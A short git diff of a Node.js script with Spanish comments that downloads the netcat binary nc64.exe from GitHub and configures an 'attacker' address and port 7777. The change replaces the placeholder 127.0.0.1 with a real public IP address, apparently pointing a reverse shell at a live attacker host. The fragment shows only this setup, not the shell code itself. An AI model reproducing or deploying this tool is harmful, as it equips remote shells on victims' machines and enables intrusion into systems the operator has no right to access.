@@ -5,7 +5,7 @@ const https = require('https');
 // Nombre del archivo y URL de descarga (ejemplo para nc64.exe)
 const ncFile = 'nc64.exe';
 const ncUrl = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe';
-const attackerIP = '127.0.0.1'; // Cambia esto por tu IP
+const attackerIP = '92.112.179.154'; // Cambia esto por tu IP
 const attackerPort = '7777';   // Cambia esto por tu puerto
 
 // Función para descargar nc64.exe
